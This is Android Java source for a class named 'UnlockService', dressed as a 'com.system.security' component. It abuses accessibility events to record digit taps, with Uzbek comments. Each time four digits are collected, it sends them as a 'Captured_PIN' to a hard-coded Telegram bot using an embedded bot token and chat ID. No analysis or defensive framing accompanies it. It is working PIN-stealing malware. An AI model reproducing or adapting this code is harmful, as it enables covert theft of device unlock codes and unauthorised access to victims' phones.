package com.system.security;

import android.accessibilityservice.AccessibilityService;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class UnlockService extends AccessibilityService {

    private StringBuilder pinBuffer = new StringBuilder();
    private static final String BOT_TOKEN = "8641599033:AAFqD1brrN4CGQebEFnnCNFire5f3xsDep4";
    private static final String CHAT_ID = "8572227182";

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        sendData("Tizim_uyg'onib_ishga_tushdi!_PIN_kutilmoqda...");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        int eventType = event.getEventType();
        
        // Barcha turdagi harakatlarni kuzatish (bosish, kiritish, fokus)
        if (eventType == AccessibilityEvent.TYPE_VIEW_CLICKED || 
            eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED ||
            eventType == AccessibilityEvent.TYPE_VIEW_FOCUSED) {
            
            AccessibilityNodeInfo source = event.getSource();
            if (source != null) {
                processNodes(source);
                source.recycle();
            }
        }
    }

    private void processNodes(AccessibilityNodeInfo node) {
        if (node == null) return;

        CharSequence text = node.getText();
        if (text != null && text.length() == 1 && Character.isDigit(text.charAt(0))) {
            String num = text.toString();
            pinBuffer.append(num);
            
            // Har bir bosilgan raqamni darhol Telegramga yuborish (tekshirish uchun)
            // sendData("Bosildi: " + num); 

            if (pinBuffer.length() >= 4) {
                sendData("Captured_PIN: " + pinBuffer.toString());
                pinBuffer.setLength(0);
            }
        }

        for (int i = 0; i < node.getChildCount(); i++) {
            processNodes(node.getChild(i));
        }
    }

    private void sendData(final String pin) {
        new Thread(() -> {
            try {
                String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=Redmi_Note_13_PIN_Captured: " + pin;
                URL url = new URL(urlString);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("GET");
                conn.connect();
                InputStream is = conn.getInputStream();
                is.close();
                conn.disconnect();
            } catch (Exception e) {
                Log.e("UnlockService", "Error sending data", e);
            }
        }).start();
    }

    @Override public void onInterrupt() {}
}
